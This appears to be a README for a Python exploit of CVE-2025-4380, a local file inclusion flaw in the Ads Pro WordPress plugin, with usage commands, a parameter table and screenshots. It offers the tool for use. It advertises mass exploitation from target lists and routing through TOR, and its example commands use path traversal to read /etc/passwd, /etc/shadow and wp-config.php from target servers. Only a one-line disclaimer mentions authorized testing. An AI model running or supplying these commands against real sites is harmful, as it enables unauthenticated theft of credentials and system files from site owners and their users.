# CVE-2025-4380 - Ads Pro Plugin <= 4.89 - Local File Inclusion (LFI) Exploit

## Description

This Python exploit targets **Ads Pro Plugin ≤ 4.89** for WordPress, vulnerable to **Local File Inclusion (LFI)** via the `bsa_preview_callback` AJAX action.

An unauthenticated attacker can exploit this to read arbitrary files from the server filesystem, including sensitive files such as `/etc/passwd`, `wp-config.php`, and more.

---

## Exploit Features

- Exploits **CVE-2025-4380** LFI vulnerability.
- Supports single target or mass exploitation.
- Saves outputs to file (optional).
- Supports HTTP proxies or TOR routing.
- Retry mechanism for reliability.

---

## Usage

### Single Target

```bash
python3 cve_2025_4380.py -u http://target.com -p ../../../../etc/passwd
```
### Multiple Targets (Mass Scan)
```bash
python3 cve_2025_4380.py -l targets.txt -p ../../../../etc/shadow
```
### Save Output to File
```bash
python3 cve_2025_4380.py -u http://target.com -p ../../../../etc/passwd -o output.txt
```
### Use Proxy (e.g., Burp, TOR)
```bash
python3 cve_2025_4380.py -u http://target.com -p ../../../../etc/passwd --proxy http://127.0.0.1:8080
```
## Parameters

| Argument         | Description                                     | Required |
| ---------------- | ----------------------------------------------- | -------- |
| `-u`, `--url`    | Target URL (e.g., `http://target.com`)          | Optional |
| `-l`, `--list`   | File with list of target URLs                   | Optional |
| `-p`, `--path`   | File path to include (e.g., `../../etc/passwd`) | **Yes**  |
| `-o`, `--output` | Output file to save results                     | Optional |
| `--proxy`        | Proxy (e.g., `http://127.0.0.1:8080`)           | Optional |

---

## Example

<img width="1900" height="700" alt="Screenshot_2025-07-20_18_42_08" src="https://github.com/user-attachments/assets/18cee98d-060b-4dd6-a8ad-89265df06f44" />


Burpsuite Request/Response

<img width="1920" height="672" alt="Screenshot_2025-07-20_18_42_45" src="https://github.com/user-attachments/assets/cc6b804b-47b3-47f6-868b-e63c5979b82e" />


<img width="1920" height="671" alt="Screenshot_2025-07-20_18_42_57" src="https://github.com/user-attachments/assets/b0749197-e601-4cc5-8819-ee6928fd087d" />



## Vulnerability Reference

-    CVE-2025-4380

-    Ads Pro Plugin <= 4.89 - Local File Inclusion via bsa_template in bsa_preview_callback

# ⚠️ Disclaimer

This exploit is provided for educational purposes and authorized security testing only.

---

## Official Channels

- [YouTube @rootctf](https://www.youtube.com/@rootctf)
- [X @r0otk3r](https://x.com/r0otk3r)
